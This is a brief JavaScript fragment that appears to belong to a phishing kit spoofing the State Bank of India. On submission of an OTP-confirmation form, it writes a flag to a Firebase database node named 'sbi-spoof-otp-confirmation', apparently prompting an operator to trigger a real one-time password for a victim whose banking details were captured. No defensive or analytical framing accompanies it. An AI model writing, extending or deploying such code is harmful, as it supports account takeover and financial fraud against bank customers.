
//For Otp confirmation
// reference your database
var spoofData = firebase.database().ref("sbi-spoof-otp-confirmation");

document.getElementById("otp_confirm").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();   

    saveOtpGenerate();

    //   reset the form
    
}
const saveOtpGenerate = () => {
    var newSpoofData = spoofData.push();

    newSpoofData.set({
        generateOtp: true,
    });
};
